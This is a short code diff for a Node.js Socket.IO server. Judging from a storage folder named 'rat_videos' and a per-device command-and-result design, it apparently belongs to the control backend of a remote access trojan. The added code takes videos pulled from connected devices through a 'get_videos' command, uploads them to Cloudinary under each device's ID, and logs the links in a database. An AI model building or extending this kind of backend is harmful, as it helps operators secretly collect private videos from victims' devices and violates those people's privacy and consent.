@@ -272,6 +272,37 @@ io.on('connection', async (socket) => {
             }
           }
 
+          // For video result with base64 data → Upload to Cloudinary
+          if (cleanResult && cleanResult.data && cleanResult.command === 'get_videos') {
+            try {
+              const mimeType = cleanResult.mimeType || 'video/mp4';
+              const uploadRes = await cloudinary.uploader.upload(
+                `data:${mimeType};base64,${cleanResult.data}`,
+                { folder: `rat_videos/${socket.deviceId}`, resource_type: 'video' }
+              );
+              cleanResult.cloudinaryUrl = uploadRes.secure_url;
+              cleanResult.cloudinaryPublicId = uploadRes.public_id;
+              delete cleanResult.data;
+            } catch (cloudErr) {
+              console.error('Cloudinary video upload error:', cloudErr.message);
+            }
+          }
+
+          // If video was uploaded to Cloudinary, also push to data.videos array
+          if (cleanResult && cleanResult.cloudinaryUrl && cleanResult.command === 'get_videos') {
+            updateDoc.$push = {
+              ...updateDoc.$push,
+              'data.videos': {
+                url: cleanResult.cloudinaryUrl,
+                publicId: cleanResult.cloudinaryPublicId,
+                name: cleanResult.name || 'video',
+                size: cleanResult.size || 0,
+                mimeType: cleanResult.mimeType || 'video/mp4',
+                timestamp: new Date()
+              }
+            };
+          }
+
           // Persist result data into device.data
           const dataSetOps = {};
           if (cleanResult && typeof cleanResult === 'object' && !cleanResult.error) {
